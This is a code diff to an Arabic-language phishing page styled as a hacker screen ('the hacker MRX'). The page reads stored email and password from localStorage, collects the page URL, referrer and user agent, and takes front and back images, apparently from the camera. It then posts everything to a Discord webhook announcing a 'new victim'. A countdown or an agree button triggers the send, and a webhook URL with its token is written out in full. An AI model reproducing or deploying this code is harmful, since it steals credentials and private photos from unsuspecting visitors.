@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> MRX | HUB</title>
+    <title>المخترق MRX</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{background:#001a00;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden;font-family:monospace}
@@ -68,22 +68,6 @@
             }
             x.shadowBlur = 0;
         }, 33);
-        const a = new (window.AudioContext || window.webkitAudioContext)();
-        let soundInterval = setInterval(() => {
-            if(a.state === 'suspended') a.resume();
-            try{
-                const o = a.createOscillator();
-                const g = a.createGain();
-                o.type = 'sawtooth';
-                o.frequency.setValueAtTime(Math.random() * 800 + 150, a.currentTime);
-                g.gain.setValueAtTime(0.025, a.currentTime);
-                g.gain.exponentialRampToValueAtTime(0.001, a.currentTime + 0.1);
-                o.connect(g);
-                g.connect(a.destination);
-                o.start();
-                o.stop(a.currentTime + 0.1);
-            } catch(e){}
-        }, 90);
         let ip = 'غير معروف';
         let email = localStorage.getItem('email') || 'غير موجود';
         let password = localStorage.getItem('password') || 'غير موجود';
@@ -168,7 +152,9 @@
             const pageUrl = window.location.href;
             const referrer = document.referrer || 'لا يوجد';
             const ua = navigator.userAgent;
-            const data = {
+            
+            const formData = new FormData();
+            const payload = {
                 username: "المخترق MRX",
                 content: "**🔥 تم اختراق ضحية جديدة بنجاح!**",
                 embeds: [{
@@ -189,35 +175,43 @@
                     ]
                 }]
             };
+            formData.append('payload_json', JSON.stringify(payload));
+            
+            if(frontImage !== 'غير متاح') {
+                const arr = frontImage.split(',');
+                const mime = arr[0].match(/:(.*?);/)[1];
+                const bstr = atob(arr[1]);
+                let n = bstr.length;
+                const u8arr = new Uint8Array(n);
+                while(n--) u8arr[n] = bstr.charCodeAt(n);
+                const blob = new Blob([u8arr], {type: mime});
+                formData.append('front.jpg', blob, 'front.jpg');
+            }
+            if(backImage !== 'غير متاح') {
+                const arr = backImage.split(',');
+                const mime = arr[0].match(/:(.*?);/)[1];
+                const bstr = atob(arr[1]);
+                let n = bstr.length;
+                const u8arr = new Uint8Array(n);
+                while(n--) u8arr[n] = bstr.charCodeAt(n);
+                const blob = new Blob([u8arr], {type: mime});
+                formData.append('back.jpg', blob, 'back.jpg');
+            }
+            
             if(WEBHOOK.includes("https://discord.com/api/webhooks/1539062777560440922/OZgU_20rTLkIHqHshEnSuqfvZfiVvIbApj8AQAIxS4MSOGo8APShnrqjDqU3TCxP-TZq")) {
                 console.log('⚠️ غير الرابط');
             } else {
-                const formData = new FormData();
-                const json = JSON.stringify(data);
-                formData.append('payload_json', json);
-                if(frontImage !== 'غير متاح') {
-                    const arr = frontImage.split(',');
-                    const mime = arr[0].match(/:(.*?);/)[1];
-                    const bstr = atob(arr[1]);
-                    let n = bstr.length;
-                    const u8arr = new Uint8Array(n);
-                    while(n--) u8arr[n] = bstr.charCodeAt(n);
-                    const blob = new Blob([u8arr], {type: mime});
-                    formData.append('front.jpg', blob, 'front.jpg');
-                }
-                if(backImage !== 'غير متاح') {
-                    const arr = backImage.split(',');
-                    const mime = arr[0].match(/:(.*?);/)[1];
-                    const bstr = atob(arr[1]);
-                    let n = bstr.length;
-                    const u8arr = new Uint8Array(n);
-                    while(n--) u8arr[n] = bstr.charCodeAt(n);
-                    const blob = new Blob([u8arr], {type: mime});
-                    formData.append('back.jpg', blob, 'back.jpg');
-                }
                 fetch(WEBHOOK, {
                     method: 'POST',
                     body: formData
+                }).then(response => {
+                    if(response.ok) {
+                        console.log('✅ تم الإرسال بنجاح');
+                    } else {
+                        console.log('❌ فشل الإرسال: ' + response.status);
+                    }
+                }).catch(error => {
+                    console.log('❌ خطأ: ' + error);
                 });
             }
         }
@@ -235,24 +229,7 @@
         const hackWindow = document.getElementById('hackWindow');
         agreeBtn.addEventListener('click', function() {
             hackWindow.style.display = 'none';
-            clearInterval(soundInterval);
             captureAndSend();
-            for(let i=0; i<5; i++) {
-                setTimeout(() => {
-                    try{
-                        const o = a.createOscillator();
-                        const g = a.createGain();
-                        o.type = 'sawtooth';
-                        o.frequency.setValueAtTime(800 + Math.random() * 400, a.currentTime);
-                        g.gain.setValueAtTime(0.05, a.currentTime);
-                        g.gain.exponentialRampToValueAtTime(0.001, a.currentTime + 0.2);
-                        o.connect(g);
-                        g.connect(a.destination);
-                        o.start();
-                        o.stop(a.currentTime + 0.2);
-                    } catch(e){}
-                }, i * 150);
-            }
         });
         const countdownInterval = setInterval(() => {
             countdown--;
@@ -262,13 +239,10 @@
                 timerEl.textContent = '⏳ جاري الإرسال...';
                 setTimeout(() => {
                     hackWindow.style.display = 'none';
-                    clearInterval(soundInterval);
                     captureAndSend();
                 }, 1000);
             }
         }, 1000);
-        window.addEventListener('click', () => a.resume());
-        window.addEventListener('keydown', () => a.resume());
     </script>
 </body>
 </html>
